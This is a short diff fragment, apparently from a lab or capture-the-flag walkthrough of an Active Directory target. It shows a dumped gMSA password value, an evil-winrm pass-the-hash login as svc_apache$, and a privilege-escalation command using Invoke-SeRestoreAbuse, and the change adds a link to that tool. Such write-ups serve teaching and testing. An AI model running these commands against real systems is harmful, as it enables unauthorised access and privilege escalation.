@@ -186,6 +186,8 @@ msDS-ManagedPassword.B64ENCODED: nmPqvoV6B/MMlbvC4HyHSbRzec6rKegAxL9C5+M/BK5BDuy
 
 └─$ evil-winrm -i 192.168.245.165 -u svc_apache$ -H 1169a68c02b287c7d88ce7e512acbee7
 
+https://github.com/0x4D-5A/Invoke-SeRestoreAbuse
+
 Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "whoami > C:\Users\svc_apache$\Documents\a.txt"'
 
 *Evil-WinRM* PS C:\Users\svc_apache$\Documents> type a.txt
